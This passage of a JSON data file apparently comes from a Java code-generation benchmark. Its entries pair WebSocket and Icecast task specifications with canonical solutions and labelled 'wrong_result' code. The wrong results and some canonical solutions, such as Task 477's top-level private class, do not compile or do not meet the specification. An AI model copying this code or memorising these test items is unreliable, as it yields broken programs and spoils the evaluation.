    "Canonical_solution": "import org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport java.net.URI;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketClient extends WebSocketClient {\n    private final CountDownLatch onCloseLatch;\n\n    public MyWebSocketClient(URI uri, CountDownLatch latch) {\n        super(uri);\n        onCloseLatch = latch;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        // Connection opened callback\n    }\n\n    @Override\n    public void onMessage(String message) {\n        // Message received callback\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        onCloseLatch.countDown();\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        // Error handling callback\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "wrong_result": "public class MyWebSocketClient extends WebSocketClient {\n    private final CountDownLatch onCloseLatch;\n\n    public MyWebSocketClient(URI uri, CountDownLatch latch) {\n        super(uri);\n        this.onCloseLatch = latch;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        System.out.println(\"Connected to WebSocket server.\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(\"Received message: \" + message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        onCloseLatch.countDown();\n        System.out.println(\"Connection closed. Code: \" + code + \", Reason: \" + reason + \", Remote: \" + remote);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        System.err.println(\"Error occurred: \" + ex.getMessage());\n        ex.printStackTrace();\n    }\n}"
  },
  {
    "Task_id": 467,
    "Instruction": "Task Description: Implement a secure WebSocket client class in Java that supports SSL/TLS with configurable endpoint identification algorithm for secure communication.\n\nClass Description: SSLWebSocketClient is a WebSocket client implementation that extends the WebSocketClient class from org.java_websocket library. It provides SSL/TLS support with customizable endpoint identification algorithm for secure WebSocket connections. The class includes event handlers for WebSocket lifecycle events and SSL-specific error handling.\n\nAttributes:\n- endpointIdentificationAlgorithm: String - The algorithm used for endpoint identification during SSL handshake\n- onSSLError: boolean - Flag indicating whether an SSL error occurred during connection\n- onOpen: boolean - Flag indicating whether the WebSocket connection was successfully opened\n\nMethods:\n- SSLWebSocketClient(String address, int port, String endpointIdentificationAlgorithm) -> None - Constructor that initializes the WebSocket client with server address, port, and endpoint identification algorithm\n- onOpen(ServerHandshake handshakedata) -> void - Callback triggered when WebSocket connection is successfully opened\n- onMessage(String message) -> void - Callback triggered when a message is received from the server\n- onClose(int code, String reason, boolean remote) -> void - Callback triggered when WebSocket connection is closed\n- onError(Exception ex) -> void - Callback triggered when an error occurs, with special handling for SSL errors\n- onSetSSLParameters(SSLParameters sslParameters) -> void - Override method to configure SSL parameters including endpoint identification algorithm",
    "Canonical_solution": "import java.net.URI;\nimport javax.net.ssl.SSLParameters;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class SSLWebSocketClient extends WebSocketClient {\n\n    private final String endpointIdentificationAlgorithm;\n    public boolean onSSLError = false;\n    public boolean onOpen = false;\n\n    public SSLWebSocketClient(String address, int port, String endpointIdentificationAlgorithm)\n        throws java.net.URISyntaxException {\n        super(new URI(\"wss://\" + address + ':' + port));\n        this.endpointIdentificationAlgorithm = endpointIdentificationAlgorithm;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        this.onOpen = true;\n    }\n\n    @Override\n    public void onMessage(String message) {\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        if (ex instanceof javax.net.ssl.SSLHandshakeException) {\n            this.onSSLError = true;\n        }\n    }\n\n    @Override\n    protected void onSetSSLParameters(SSLParameters sslParameters) {\n        super.onSetSSLParameters(sslParameters);\n        if (endpointIdentificationAlgorithm != null) {\n            sslParameters.setEndpointIdentificationAlgorithm(endpointIdentificationAlgorithm);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "wrong_result": "public class SSLWebSocketClient extends WebSocketClient {\n    private String endpointIdentificationAlgorithm;\n    private boolean onSSLError;\n    private boolean onOpen;\n\n    public SSLWebSocketClient(String address, int port, String endpointIdentificationAlgorithm) {\n        super(address, port);\n        this.endpointIdentificationAlgorithm = endpointIdentificationAlgorithm;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        onOpen = true;\n        super.onOpen(handshakedata);\n    }\n\n    @Override\n    public void onMessage(String message) {\n        // Handle message\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        // Handle close\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        if (ex instanceof SSLException) {\n            onSSLError = true;\n        }\n        // Handle error\n    }\n\n    @Override\n    public void onSetSSLParameters(SSLParameters sslParameters) {\n        sslParameters.setEndpointIdentificationAlgorithm(endpointIdentificationAlgorithm);\n    }\n}"
  },
  {
    "Task_id": 469,
    "Instruction": "Task Description: Implement a WebSocket server class in Java using the org.java_websocket library to handle client connections, messages, disconnections, and errors, with synchronization support using CountDownLatch.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends WebSocketServer from org.java_websocket. It manages client connections and messages while providing synchronization points for server startup and message reception using CountDownLatch.\n\nAttributes:\ncountServerLatch: [CountDownLatch] - Synchronization aid to signal when the server has started  \ncountClientMessageLatch: [CountDownLatch] - Synchronization aid to signal when a client message is received  \n\nMethods:\nConstructor: [MyWebSocketServer](int port, CountDownLatch serverDownLatch, CountDownLatch countClientMessageLatch) -> [void] - Initializes the WebSocket server with specified port and synchronization latches  \nonOpen: [onOpen](WebSocket conn, ClientHandshake handshake) -> [void] - Callback for new client connections  \nonClose: [onClose](WebSocket conn, int code, String reason, boolean remote) -> [void] - Callback for client disconnections  \nonMessage: [onMessage](WebSocket conn, String message) -> [void] - Callback for processing received messages (decrements message latch)  \nonError: [onError](WebSocket conn, Exception ex) -> [void] - Callback for error handling (prints stack trace)  \nonStart: [onStart]() -> [void] - Callback when server starts (decrements server latch)",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private final CountDownLatch countServerLatch;\n    private final CountDownLatch countClientMessageLatch;\n\n    public MyWebSocketServer(int port, CountDownLatch serverDownLatch,\n        CountDownLatch countClientMessageLatch) {\n        super(new InetSocketAddress(port));\n        this.countServerLatch = serverDownLatch;\n        this.countClientMessageLatch = countClientMessageLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        countClientMessageLatch.countDown();\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        countServerLatch.countDown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "wrong_result": "public class MyWebSocketServer extends WebSocketServer {\n    private final CountDownLatch countServerLatch;\n    private final CountDownLatch countClientMessageLatch;\n\n    public MyWebSocketServer(int port, CountDownLatch serverDownLatch, CountDownLatch countClientMessageLatch) {\n        super(port, true);\n        this.countServerLatch = serverDownLatch;\n        this.countClientMessageLatch = countClientMessageLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        // Handle new connection if needed\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle client disconnection\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        countClientMessageLatch.countDown();\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        countServerLatch.countDown();\n    }\n}"
  },
  {
    "Task_id": 47,
    "Instruction": "Task Description: Create a Java class that implements metadata updates for an Icecast broadcast server using HTTP client functionality.\n\nClass Description: The IcecastBroadcastMetadataUpdater class is responsible for sending metadata updates to an Icecast server via HTTP requests. It constructs the appropriate URL, handles authentication, and manages the HTTP communication asynchronously. The class implements the IBroadcastMetadataUpdater interface and handles character encoding, error logging, and connection status tracking.\n\nAttributes:\n- mLog: Logger - Logger instance for error and status logging\n- mHttpClient: HttpClient - HTTP client instance for making requests\n- mIcecastConfiguration: IcecastConfiguration - Configuration object containing server details (host, port, mount point, credentials)\n- mConnectionLoggingSuppressed: boolean - Flag to prevent duplicate connection error logs\n\nMethods:\n- IcecastBroadcastMetadataUpdater(IcecastConfiguration icecastConfiguration) -> void - Constructor that initializes the class with Icecast server configuration\n- update(IdentifierCollection identifierCollection) -> void - Main method that constructs and sends the metadata update request to the Icecast server. Takes an IdentifierCollection containing metadata information as input. Handles URL construction, encoding, and asynchronous request execution.",
    "Canonical_solution": "import io.github.dsheirer.audio.broadcast.IBroadcastMetadataUpdater;\nimport io.github.dsheirer.audio.broadcast.icecast.IcecastConfiguration;\nimport io.github.dsheirer.audio.broadcast.icecast.IcecastMetadata;\nimport io.github.dsheirer.identifier.IdentifierCollection;\nimport io.github.dsheirer.properties.SystemProperties;\nimport io.github.dsheirer.util.ThreadPool;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.io.UnsupportedEncodingException;\nimport java.net.URI;\nimport java.net.URLEncoder;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\n\npublic class IcecastBroadcastMetadataUpdater implements IBroadcastMetadataUpdater\n{\n    private final static Logger mLog = LoggerFactory.getLogger(IcecastBroadcastMetadataUpdater.class);\n    private final static String UTF8 = \"UTF-8\";\n    private HttpClient mHttpClient = HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).build();\n    private IcecastConfiguration mIcecastConfiguration;\n    private boolean mConnectionLoggingSuppressed = false;\n\n    public IcecastBroadcastMetadataUpdater(IcecastConfiguration icecastConfiguration)\n    {\n        mIcecastConfiguration = icecastConfiguration;\n    }\n\n    public void update(IdentifierCollection identifierCollection)\n    {\n        if(mIcecastConfiguration.hasInline())\n        {\n            return;\n        }\n\n        StringBuilder sb = new StringBuilder();\n\n        try\n        {\n            sb.append(\"http://\");\n            sb.append(mIcecastConfiguration.getHost());\n            sb.append(\":\");\n            sb.append(mIcecastConfiguration.getPort());\n            sb.append(\"/admin/metadata?mode=updinfo&mount=\");\n            sb.append(URLEncoder.encode(mIcecastConfiguration.getMountPoint(), UTF8));\n            sb.append(\"&charset=UTF%2d8\");\n            sb.append(\"&song=\").append(URLEncoder.encode(IcecastMetadata.getTitle(identifierCollection), UTF8));\n        }\n        catch(UnsupportedEncodingException uee)\n        {\n            mLog.error(\"Error encoding metadata information to UTF-8\", uee);\n            sb = null;\n        }\n\n        if(sb != null)\n        {\n            final String metadataUpdateURL = sb.toString();\n            URI uri = URI.create(metadataUpdateURL);\n\n            ThreadPool.CACHED.submit(new Runnable()\n            {\n                @Override\n                public void run()\n                {\n                    try\n                    {\n                        HttpRequest request = HttpRequest.newBuilder()\n                            .uri(uri)\n                            .header(\"Authorization\", mIcecastConfiguration.getBase64EncodedCredentials())\n                            .header(\"User-Agent\", SystemProperties.getInstance().getApplicationName())\n                            .GET()\n                            .build();\n\n                        HttpResponse<String> response = mHttpClient.send(request, HttpResponse.BodyHandlers.ofString());\n\n                        if(response != null)\n                        {\n                            if(response.statusCode() == 200)\n                            {\n                                mConnectionLoggingSuppressed = false;\n                            }\n                            else if(!mConnectionLoggingSuppressed)\n                            {\n                                mLog.info(\"Error submitting Icecast 2 Metadata update to URL [\" + metadataUpdateURL +\n                                    \"] HTTP Response Code [\" + response.statusCode() + \"] Body [\" + response.body() + \"]\");\n                                mConnectionLoggingSuppressed = true;\n                            }\n                        }\n                    }\n                    catch(IOException | InterruptedException e)\n                    {\n                        mLog.error(\"Error submitting Icecast metadata update\", e);\n                    }\n                }\n            });\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "public class IcecastBroadcastMetadataUpdater implements IBroadcastMetadataUpdater {\n    private final Logger mLog;\n    private final HttpClient mHttpClient;\n    private final IcecastConfiguration mIcecastConfiguration;\n    private boolean mConnectionLoggingSuppressed;\n\n    public IcecastBroadcastMetadataUpdater(IcecastConfiguration icecastConfiguration) {\n        this.mLog = Logger.getLogger(IcecastBroadcastMetadataUpdater.class.getName());\n        this.mIcecastConfiguration = icecastConfiguration;\n        this.mConnectionLoggingSuppressed = false;\n        this.mHttpClient = HttpClient.newBuilder()\n                .version(HttpClient.Version.HTTP_1_1)\n                .build();\n    }\n\n    @Override\n    public void update(IdentifierCollection identifierCollection) {\n        try {\n            String metadataXml = buildMetadataXml(identifierCollection);\n            String url = buildMetadataUrl();\n            \n            HttpRequest request = HttpRequest.newBuilder()\n                    .uri(URI.create(url))\n                    .header(\"Content-Type\", \"application/xml\")\n                    .header(\"Authorization\", \"Basic \" + Base64.getEncoder().encodeToString(\n                            (mIcecastConfiguration.getUsername() + \":\" + mIcecastConfiguration.getPassword()).getBytes(StandardCharsets.UTF_8)\n                    ))\n                    .POST(HttpRequest.BodyPublishers.ofString(metadataXml))\n                    .build();\n            \n            mHttpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString())\n                    .thenAccept(response -> {\n                        if (response.statusCode() != 200) {\n                            mLog.severe(\"Metadata update failed with status code: \" + response.statusCode());\n                        }\n                    })\n                    .exceptionally(ex -> {\n                        if (!mConnectionLoggingSuppressed) {\n                            mLog.severe(\"Error sending metadata update: \" + ex.getMessage());\n                            mConnectionLoggingSuppressed = true;\n                        }\n                        return null;\n                    });\n        } catch (Exception e) {\n            if (!mConnectionLoggingSuppressed) {\n                mLog.severe(\"Error initializing metadata update: \" + e.getMessage());\n                mConnectionLoggingSuppressed = true;\n            }\n        }\n    }\n\n    private String buildMetadataUrl() {\n        return String.format(\"http://%s:%d/admin/metadata?mount=%s&format=ogg\",\n                mIcecastConfiguration.getHost(),\n                mIcecastConfiguration.getPort(),\n                mIcecastConfiguration.getMountPoint());\n    }\n\n    private String buildMetadataXml(IdentifierCollection identifiers) {\n        StringBuilder xml = new StringBuilder(\"<icecast>\");\n        for (Map.Entry<String, String> entry : identifiers.getEntries()) {\n            xml.append(String.format(\"<%s>%s</%s>\", entry.getKey(), entry.getValue(), entry.getKey()));\n        }\n        xml.append(\"</icecast>\");\n        return xml.toString();\n    }\n}"
  },
  {
    "Task_id": 472,
    "Instruction": "Task Description: Implement a WebSocket server using the org.java_websocket library to handle client connections, messages, disconnections, and errors.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends the WebSocketServer class from the org.java_websocket library. It provides lifecycle methods for managing client connections and communication.\n\nAttributes:\n- countServerLatch: CountDownLatch - A synchronization aid that allows one or more threads to wait until a set of operations being performed in other threads completes.\n\nMethods:\n- MyWebSocketServer(int port, CountDownLatch serverDownLatch) -> None - Constructor that initializes the WebSocket server with the specified port and CountDownLatch.\n- onOpen(WebSocket conn, ClientHandshake handshake) -> None - Called when a new client connection is established.\n- onClose(WebSocket conn, int code, String reason, boolean remote) -> None - Called when a client connection is closed.\n- onMessage(WebSocket conn, String message) -> None - Called when a message is received from a client.\n- onError(WebSocket conn, Exception ex) -> None - Called when an error occurs.\n- onStart() -> None - Called when the server starts successfully.",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private final CountDownLatch countServerLatch;\n\n    public MyWebSocketServer(int port, CountDownLatch serverDownLatch) {\n        super(new InetSocketAddress(port));\n        this.countServerLatch = serverDownLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        // Handle new client connection\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle client disconnection\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Process received message\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        // Handle errors\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        // Server startup complete\n        countServerLatch.countDown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "wrong_result": "public class MyWebSocketServer extends WebSocketServer {\n    private final CountDownLatch countServerLatch;\n\n    public MyWebSocketServer(int port, CountDownLatch serverDownLatch) {\n        super(port);\n        this.countServerLatch = serverDownLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"New client connected\");\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Client disconnected: \" + reason);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received message: \" + message);\n        conn.send(\"Echo: \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        countServerLatch.countDown();\n    }\n}"
  },
  {
    "Task_id": 477,
    "Instruction": "Task Description: Create a WebSocket server implementation using the org.java_websocket library to handle real-time bidirectional communication between clients and the server.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends WebSocketServer from the org.java_websocket library. It handles client connections, message processing, disconnections, and error scenarios in a WebSocket communication environment.\n\nAttributes:\nNone explicitly declared in this implementation (inherits attributes from WebSocketServer parent class)\n\nMethods:\n1. onOpen(WebSocket conn, ClientHandshake handshake) -> void - Called when a new client connects to the server\n   - conn: WebSocket - The client connection object\n   - handshake: ClientHandshake - The handshake data from the client\n\n2. onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Called when a client disconnects from the server\n   - conn: WebSocket - The client connection object\n   - code: int - The status code for disconnection\n   - reason: String - The reason for disconnection\n   - remote: boolean - Whether the disconnection was initiated by the remote host\n\n3. onMessage(WebSocket conn, String message) -> void - Called when a message is received from a client\n   - conn: WebSocket - The client connection object\n   - message: String - The received message content\n\n4. onError(WebSocket conn, Exception ex) -> void - Called when an error occurs\n   - conn: WebSocket - The client connection object (may be null if error isn't associated with a specific connection)\n   - ex: Exception - The exception that occurred\n\n5. onStart() -> void - Called when the server starts successfully\n\n6. LocalWebSocketFactory (nested class) - Implements WebSocketServerFactory for custom WebSocket creation\n   Methods:\n   a. createWebSocket(WebSocketAdapter a, Draft d) -> WebSocketImpl\n   b. createWebSocket(WebSocketAdapter a, List<Draft> drafts) -> WebSocketImpl\n   c. wrapChannel(SocketChannel channel, SelectionKey key) -> ByteChannel\n   d. close() -> void",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.channels.ByteChannel;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.SocketChannel;\nimport java.util.List;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.WebSocketAdapter;\nimport org.java_websocket.WebSocketImpl;\nimport org.java_websocket.WebSocketServerFactory;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        // Handle new client connection\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle client disconnection\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Process received message\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        // Handle errors\n    }\n\n    @Override\n    public void onStart() {\n        // Server startup logic\n    }\n}\n\nprivate class LocalWebSocketFactory implements WebSocketServerFactory {\n\n    @Override\n    public WebSocketImpl createWebSocket(WebSocketAdapter a, Draft d) {\n        return null;\n    }\n\n    @Override\n    public WebSocketImpl createWebSocket(WebSocketAdapter a, List<Draft> drafts) {\n        return null;\n    }\n\n    @Override\n    public ByteChannel wrapChannel(SocketChannel channel, SelectionKey key) throws IOException {\n        return null;\n    }\n\n    @Override\n    public void close() {\n        // Cleanup resources\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "wrong_result": "public class MyWebSocketServer extends WebSocketServer {\n    public MyWebSocketServer(int port) {\n        super(new InetSocketAddress(port));\n        setWebSocketFactory(new LocalWebSocketFactory());\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"New connection from \" + conn.getRemoteSocketAddress());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed: \" + conn.getRemoteSocketAddress() + \" (\" + reason + \")\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received message from \" + conn.getRemoteSocketAddress() + \": \" + message);\n        conn.send(\"Echo: \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        System.err.println(\"Error occurred: \" + ex.getMessage());\n        if (conn != null) {\n            conn.close();\n        }\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"WebSocket server started on port \" + getLocalPort());\n    }\n\n    private static class LocalWebSocketFactory implements WebSocketServerFactory {\n        @Override\n        public WebSocketImpl createWebSocket(WebSocketAdapter a, Draft d) {\n            return new WebSocketImpl(a, d);\n        }\n\n        @Override\n        public WebSocketImpl createWebSocket(WebSocketAdapter a, List<Draft> drafts) {\n            return new WebSocketImpl(a, drafts);\n        }\n\n        @Override\n        public ByteChannel wrapChannel(SocketChannel channel, SelectionKey key) {\n            return channel;\n        }\n\n        @Override\n        public void close() {\n            // No-op\n        }\n    }\n}"
  },
  {
    "Task_id": 478,
    "Instruction": "Task Description: Create a WebSocket server class that handles client connections, messages, and disconnections using the org.java_websocket library. The server should also track SSL support and session information for testing purposes.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends the WebSocketServer class from the org.java_websocket library. It manages client connections, processes incoming messages, handles disconnections, and tracks SSL-related information for testing. The server notifies when it starts successfully via a CountDownLatch.\n\nAttributes:\n- testResult: [TestResult] - Stores test-related information including SSL support status and SSL session\n- countServerDownLatch: [CountDownLatch] - Used to signal when the server has successfully started\n\nMethods:\n- MyWebSocketServer([int port, TestResult testResult, CountDownLatch countServerDownLatch]) -> [void] - Constructor that initializes the server with specified port, test result object, and countdown latch\n- onOpen([WebSocket conn, ClientHandshake handshake]) -> [void] - Called when a new client connects; checks for SSL support and stores SSL session\n- onClose([WebSocket conn, int code, String reason, boolean remote]) -> [void] - Called when a client disconnects\n- onMessage([WebSocket conn, String message]) -> [void] - Called when a message is received from a client\n- onError([WebSocket conn, Exception ex]) -> [void] - Called when an error occurs; prints stack trace\n- onStart() -> [void] - Called when the server starts successfully; decrements the countdown latch",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport javax.net.ssl.SSLSession;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private final TestResult testResult;\n    private final CountDownLatch countServerDownLatch;\n\n    public MyWebSocketServer(int port, TestResult testResult, CountDownLatch countServerDownLatch) {\n        super(new InetSocketAddress(port));\n        this.testResult = testResult;\n        this.countServerDownLatch = countServerDownLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        testResult.hasSSLSupport = conn.hasSSLSupport();\n        try {\n            testResult.sslSession = conn.getSSLSession();\n        } catch (IllegalArgumentException e) {\n            // Ignore\n        }\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        countServerDownLatch.countDown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "wrong_result": "public class MyWebSocketServer extends WebSocketServer {\n    private TestResult testResult;\n    private CountDownLatch countServerDownLatch;\n\n    public MyWebSocketServer(int port, TestResult testResult, CountDownLatch countServerDownLatch) {\n        super(port);\n        this.testResult = testResult;\n        this.countServerDownLatch = countServerDownLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        testResult.setSSLSupport(conn.isSSL());\n        if (conn.isSSL()) {\n            testResult.setSSLSession(conn.getSSLSession());\n        }\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        countServerDownLatch.countDown();\n    }\n}"
  },
  {
    "Task_id": 479,
    "Instruction": "Task Description: Create a WebSocket server implementation using the org.java_websocket library that handles client connections, messages, and disconnections, with configurable connection limits and support for different WebSocket drafts.\n\nClass Description: AutobahnServerTest is a WebSocket server implementation that extends WebSocketServer from the org.java_websocket library. It manages client connections, processes incoming messages (both text and binary), tracks connection statistics, and supports graceful shutdown when reaching a configured connection limit.\n\nAttributes:\n- openCounter: [static int] - Tracks total number of opened connections\n- closeCounter: [static int] - Tracks total number of closed connections\n- limit: [int] - Maximum number of connections before server shutdown\n\nMethods:\n- Constructor: [AutobahnServerTest]([int port, int limit, Draft d]) -> [void] - Creates server instance with specified port, connection limit, and WebSocket draft\n- Constructor: [AutobahnServerTest]([InetSocketAddress address, Draft d]) -> [void] - Creates server instance with specified address and WebSocket draft\n- onOpen: [void]([WebSocket conn, ClientHandshake handshake]) -> [void] - Handles new client connections, increments openCounter\n- onClose: [void]([WebSocket conn, int code, String reason, boolean remote]) -> [void] - Handles client disconnections, increments closeCounter, shuts down server if limit reached\n- onError: [void]([WebSocket conn, Exception ex]) -> [void] - Handles connection errors, prints stack trace\n- onStart: [void]() -> [void] - Called when server starts, prints startup message\n- onMessage: [void]([WebSocket conn, String message]) -> [void] - Handles text messages, echoes back to client\n- onMessage: [void]([WebSocket conn, ByteBuffer blob]) -> [void] - Handles binary messages, echoes back to client",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.util.Collections;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.extensions.permessage_deflate.PerMessageDeflateExtension;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class AutobahnServerTest extends WebSocketServer {\n\n    private static int openCounter = 0;\n    private static int closeCounter = 0;\n    private int limit = Integer.MAX_VALUE;\n\n    public AutobahnServerTest(int port, int limit, Draft d) throws UnknownHostException {\n        super(new InetSocketAddress(port), Collections.singletonList(d));\n        this.limit = limit;\n    }\n\n    public AutobahnServerTest(InetSocketAddress address, Draft d) {\n        super(address, Collections.singletonList(d));\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        openCounter++;\n        System.out.println(\"///////////Opened connection number\" + openCounter);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        closeCounter++;\n        System.out.println(\"closed\");\n        if (closeCounter >= limit) {\n            System.exit(0);\n        }\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        System.out.println(\"Error:\");\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        conn.send(message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer blob) {\n        conn.send(blob);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "wrong_result": "public class AutobahnServerTest extends WebSocketServer {\n    public static int openCounter = 0;\n    public static int closeCounter = 0;\n    private int limit;\n\n    public AutobahnServerTest(int port, int limit, Draft d) {\n        super(port, d);\n        this.limit = limit;\n    }\n\n    public AutobahnServerTest(InetSocketAddress address, Draft d) {\n        super(address, d);\n        this.limit = 100;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        openCounter++;\n        if (openCounter >= limit) {\n            this.stop();\n        }\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        closeCounter++;\n        if (remote) {\n            System.out.println(\"Remote closed: \" + reason);\n        } else {\n            System.out.println(\"Server closed: \" + reason);\n        }\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started.\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        conn.send(message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer blob) {\n        conn.send(blob);\n    }\n}"
  },
  {
    "Task_id": 480,
